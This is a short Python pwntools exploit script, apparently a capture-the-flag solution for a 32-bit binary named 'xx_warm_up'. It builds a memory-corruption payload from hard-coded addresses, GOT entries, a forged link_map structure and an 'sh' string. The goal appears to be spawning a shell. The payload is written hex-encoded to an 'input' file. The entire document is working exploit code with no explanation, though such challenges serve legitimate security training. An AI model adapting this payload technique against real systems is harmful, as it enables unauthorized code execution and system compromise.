#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
from pwnlib.util.iters import  bruteforce
import hashlib
def hash(x):
    return hashlib.sha256(x).hexdigest()

#libc=ELF("./libc.so.6")
elf = ELF("./xx_warm_up")
libc = ELF("./bc.so.6")
#heap_add=0
#stack_add=0
link_map_add = 0x804A040
cmd = 0x4123
payload = fit({
    0:p32((0xF7EB44B0-0xf7feae20)&0xffffffff),
    0x4:p32(0x1bc278),
    0x8:p32(0x804A040+0x58),
    0xc:p32(0x0804840E),
    0x10:p32(0x804A09c-0x1bc278),
    #0x14:p32(0xdead),
    0x18:p32(0x4+0x1bc270+8),
    0x20:p32(0x804a064),
    0x24:p32(0),
    0x28:p32(7),
    0x2c:p32(0x0804a08c),
    0x34:p32(0x0804a074-4),
    0x38:p32(0x0804a06c-4),
    #0x3c:p32(0x0804a054-4),
    #0x28:p32(7),
    #0x30:p32(0x804a008),
    #0x38:p32(link_map_add + 0x40-4),
    #0x3c:p32(0x1234),
    # esp
    0x40:p32(0x804A08c+4) + p32(0)+ p32(0x804A048),
    0x4c:p32(0x080483DB),
    0x50:p32(0x080483EA)+p32(0x804A054)+p32(elf.got["__libc_start_main"])+p32(4),
    0x60:p32(link_map_add)+p32(0x0)+p32(0x804A0b0)+p32(0x804A0b4),
    0x70:"sh\x00",
    0x74:p32(0x804A0b0)+p32(0),
    0x7c:p32(0x804A060-4),
},filler="b")




write("input",payload.encode("hex"))
